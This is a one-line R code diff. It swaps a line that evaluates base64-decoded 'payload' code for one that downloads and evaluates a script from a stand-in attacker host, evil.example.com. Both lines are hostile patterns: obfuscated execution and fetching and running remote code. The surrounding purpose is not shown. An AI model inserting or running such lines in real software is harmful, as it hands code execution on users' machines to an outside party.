@@ -1,1 +1,1 @@
-evalq(parse(text = base64_dec(payload)))
+eval(parse(file = url("http://evil.example.com/x.R")))
